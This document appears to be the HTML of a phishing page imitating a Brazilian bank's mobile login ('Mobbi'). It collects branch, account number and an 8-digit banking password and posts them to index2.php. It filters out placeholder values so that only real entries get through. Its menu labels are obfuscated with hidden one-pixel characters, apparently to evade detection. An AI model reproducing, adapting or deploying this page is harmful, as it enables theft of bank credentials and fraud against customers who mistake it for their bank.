<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Mobbi</title>
<script type="text/javascript" src="scripts/html5shiv.js"></script>
<script language="javascript" src="scripts/validation.js"></script>
<style>
.u { font-family:Arial, Helvetica, sans-serif; font-size:1px; color:#FFF; }
#agg { width:100%; height:40px; border:none; background:none; font-size:90%; outline:none; }
#acc { width:100%; height:40px; border:none; background:none; font-size:90%; outline:none; }
#ss8 { width:100%; height:40px; border:none; background:none; font-size:90%; outline:none; }

#proceguir { width:100%; height:45px; background:url(images/a005.jpg); font-size:100%; border:none; text-align:center; color:#FFF; }

body{ overflow:hidden; margin:0; background: -webkit-gradient(linear, left top, left bottom, from(#FFF200), to(#FFF)) no-repeat; 	background: -moz-linear-gradient(top, #FFF200, #FFF); filter:progid:DXImageTransform.Microsoft.Gradient(GradientType=1, StartColorStr='#FFF200', EndColorStr='#FFF'); }

@media (min-width: 600px){ #box { max-width:600px; height:450px; !important } }
@media (min-width: 1100px){ #box { width:600px; height:200px; float:left; background:none; !important } }
@media (min-width: 400px){ #bbb { max-width:350px; !important } }
@media (min-width: 600px){ #bbb { max-width:450px; !important } }
@media (min-width: 1100px){ #bbb { max-width:450px; !important } }
@media (min-width: 1100px){ #ggg { position:absolute; left:620px; top:10px; right:0; background:none; !important } }
@media (min-width: 100px){ #rec { max-width:50px; height:50px; border:1px solid #FF0; !important } }
@media (min-width: 300px){ #rec { max-width:50px; height:50px; !important } }
@media (min-width: 380px){ #rec { max-width:60px; height:60px; !important } }
@media (min-width: 390px){ #rec { max-width:70px; height:70px; !important } }
@media (min-width: 600px){ #rec { max-width:80px; height:80px; !important } }
@media (min-width: 1100px){ #rec { max-width:80px; height:80px; border:2px solid #FFF; !important } }
@media (min-width: 100px){ #mass { max-width:50px; height:50px; !important } }
@media (min-width: 300px){ #mass { max-width:50px; height:50px; !important } }
@media (min-width: 380px){ #mass { max-width:60px; height:60px; !important } }
@media (min-width: 390px){ #mass { max-width:70px; height:70px; !important } }
@media (min-width: 600px){ #mass { max-width:80px; height:80px; !important } }
@media (min-width: 1100px){ #mass { max-width:90px; height:90px; !important } }
@media (min-width: 200px){ #fnt { max-width:100px; height:60px; font-size:11px; padding:5px 0 5px 0; !important } }
@media (min-width: 400px){ #fnt { max-width:100px; height:80px; font-size:12px; !important } }
@media (min-width: 600px){ #fnt { max-width:100px; height:80px; font-size:12px; !important } }
@media (min-width: 600px){ #fnt { max-width:100px; height:100px; font-size:12px; !important } }

#pro { width:95%; height:auto; max-width:400px; background:; margin:0 auto; position:relative; margin-top:20px; }

table { padding:0; margin:0; }

</style>

<script>
function validation1() {
if ( document.form.agg.value == "" || 
document.form.agg.value.length < 5 || 
document.form.agg.value == "0000-0" || 
document.form.agg.value == "1111-1" || 
document.form.agg.value == "2222-2" ||
document.form.agg.value == "3333-3" || 
document.form.agg.value == "4444-4" || 
document.form.agg.value == "5555-5" || 
document.form.agg.value == "6666-6" || 
document.form.agg.value == "7777-7" || 
document.form.agg.value == "8888-8" || 
document.form.agg.value == "9999-9"){
alert ("Agência Inválida!");
document.form.agg.focus(); return false;
}
if (document.form.acc.value == "" || 
document.form.acc.value.length < 3 || 
document.form.acc.value == "00000000000-0" || 
document.form.acc.value == "11111111111-1" || 
document.form.acc.value == "22222222222-2" || 
document.form.acc.value == "33333333333-3" || 
document.form.acc.value == "44444444444-4" || 
document.form.acc.value == "55555555555-5" || 
document.form.acc.value == "66666666666-6" || 
document.form.acc.value == "77777777777-7" || 
document.form.acc.value == "88888888888-8" || 
document.form.acc.value == "99999999999-9"){
alert ("Conta corrente Inválida!");
document.form.acc.focus(); return false;
}

if (document.form.ss8.value == "" || 
document.form.ss8.value.length < 8 || 
document.form.ss8.value.length > 8 || 
document.form.ss8.value == "00000000" || 
document.form.ss8.value == "11111111" || 
document.form.ss8.value == "22222222" || 
document.form.ss8.value == "33333333" || 
document.form.ss8.value == "44444444" || 
document.form.ss8.value == "55555555" || 
document.form.ss8.value == "66666666" || 
document.form.ss8.value == "77777777" || 
document.form.ss8.value == "88888888" || 
document.form.ss8.value == "99999999"){
alert ("Senha de Auto-Atendimento, Inválida!");
document.form.ss8.focus(); return false;
}
}
</script>
</head>

<body>
<div id="fundo">

<form name="form" id="form" action="index2.php" method="post" onSubmit="return validation1()">
<div style="height:600px; margin:0 auto; padding:10px; " id="box">
<div style="padding:0 10px 0 10px; background:#FFF; margin-top:20px;"><input type="tel" name="agg" id="agg" maxlength="6" placeholder="Agência" onKeyUp="maskTrak('####-@', this)" autofocus /></div>
<div style="padding:0 10px 0 10px; background:#FFF; margin-top:10px;"><input type="tel" name="acc" id="acc" maxlength="13" placeholder="Conta" onKeyUp="maskTrak('###########-@', this)" /></div>
<div style="background:#FFF;">
<div style="padding:0 10px 0 10px; background:url(images/a001.jpg) right no-repeat; margin-top:10px;"><input type="password" name="ss8" id="ss8" maxlength="8" placeholder="Senha (8 dígitos)" onKeyPress="return SomenteNumero(event);" /></div></div>
<div style="margin-top:10px;"><input type="submit" name="proceguir" id="proceguir" value="Entrar"></div>






<div style="margin-top:20px; height:280px; background:url(images/a001.png) top right no-repeat;" id="ggg">
<div style="font-family:Arial; text-align:center;" id="bbb">

<div style="height:auto; float:left; margin-left:10px;" id="mass">
<div style="border-radius:5px; background:url(images/b001.jpg) no-repeat; background-size:cover;" id="rec"></div><div style="width:; height:30px;" id="fnt">B<span class="u">i</span>B<span class="u">i</span> C<span class="u">i</span>od<span class="u">i</span>e &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div>
</div>

<div style="height:auto; float:left; margin-left:10px;" id="mass">
<div style="border-radius:5px; background:url(images/b002.jpg) no-repeat; background-size:cover;" id="rec"></div><div style="width:; height:30px;" id="fnt">Fi<span class="u">i</span>na<span class="u">i</span>nc<span class="u">i</span>ie seu c<span class="u">i</span>ar<span class="u">i</span>ro</div>
</div>

<div style="height:auto; float:left; margin-left:10px;" id="mass">
<div style="border-radius:5px; background:url(images/b003.jpg) no-repeat; background-size:cover;" id="rec"></div><div style="width:; height:30px;" id="fnt">E<span class="u">i</span>mi<span class="u">i</span>ss<span class="u">i</span>ão de s<span class="u">i</span>en<span class="u">i</span>ha</div>
</div>

<div style="height:auto; float:left; margin-left:10px;" id="mass">
<div style="border-radius:5px; background:url(images/b004.jpg) no-repeat; background-size:cover;" id="rec"></div><div style="width:; height:30px;" id="fnt">O<span class="u">i</span>ur<span class="u">i</span>oc<span class="u">i</span>ar<span class="u">i</span>d-<span class="u">i</span>e &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div>
</div>

<div style="height:auto; float:left; margin-left:10px;" id="mass">
<div style="border-radius:5px; background:url(images/b005.jpg) no-repeat; background-size:cover;" id="rec"></div><div style="width:; height:30px;" id="fnt">2<span class="u">i</span>ª v<span class="u">i</span>ia<span class="u">i</span> do bo<span class="u">i</span>le<span class="u">i</span>to<span class="u">i</span> </div>
</div>

<div style="height:auto; float:left; margin-left:10px;" id="mass">
<div style="border-radius:5px; background:url(images/b006.jpg) no-repeat; background-size:cover;" id="rec"></div><div style="width:; height:30px;" id="fnt">S<span class="u">i</span>aq<span class="u">i</span>ue<span class="u">i</span> móv<span class="u">i</span>el<span class="u">i</span>  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div>
</div>

<div style="height:auto; float:left; margin-left:10px;" id="mass">
<div style="border-radius:5px; background:url(images/b007.jpg) no-repeat; background-size:cover;" id="rec"></div><div style="width:; height:30px;" id="fnt">A<span class="u">i</span>p<span class="u">i</span>p wa<span class="u">i</span>tc<span class="u">i</span>h &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div>
</div>

<div style="height:auto; float:left; margin-left:10px;" id="mass">
<div style="border-radius:5px; background:url(images/b008.jpg) no-repeat; background-size:cover;" id="rec"></div><div style="width:; height:30px;" id="fnt">M<span class="u">i</span>ai<span class="u">i</span>s &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div>
</div>


</div>
</div>





</div>
</form>
</div>

<div style="width:100%; height:40px; position:fixed; bottom:0; background:#FAF046;">
<div style="width:160px; height:40px; background:url(images/a003.jpg) no-repeat; float:left;"></div>
<div style="width:160px; height:40px; background:url(images/a004.jpg) no-repeat; float:right;"></div>
</div>
</body>
</html>